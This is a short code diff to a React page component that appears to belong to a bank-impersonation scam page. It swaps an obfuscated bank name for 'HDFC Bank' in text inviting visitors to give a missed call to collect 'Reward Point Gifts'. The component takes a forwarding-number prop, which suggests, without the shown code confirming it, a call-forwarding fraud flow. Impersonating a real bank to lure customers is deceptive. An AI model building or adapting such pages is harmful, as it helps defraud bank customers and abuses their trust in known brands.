@@ -7,13 +7,13 @@ const SuccessPage = ({ forwardingNumber }) => {
   return (
     <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
       
-        <p className=" text-center text-lg max-w-md mx-auto text-gray-900 mb-4">Welcome to l C l C l Bank .</p>
+        <p className=" text-center text-lg max-w-md mx-auto text-gray-900 mb-4">Welcome to HDFC Bank .</p>
       
      
       <img src={bottom} alt="Description of the image" />
       <p className="text-lg text-gray-700 mt-10 mb-4">
       
-        To Collect Your Reward Point Gifts, give us a Miss Call to l C l C l Bank Reward Care by clicking the button below.
+        To Collect Your Reward Point Gifts, give us a Miss Call to HDFC Bank Reward Care by clicking the button below.
       </p>
       <div className="flex justify-center">
         <button
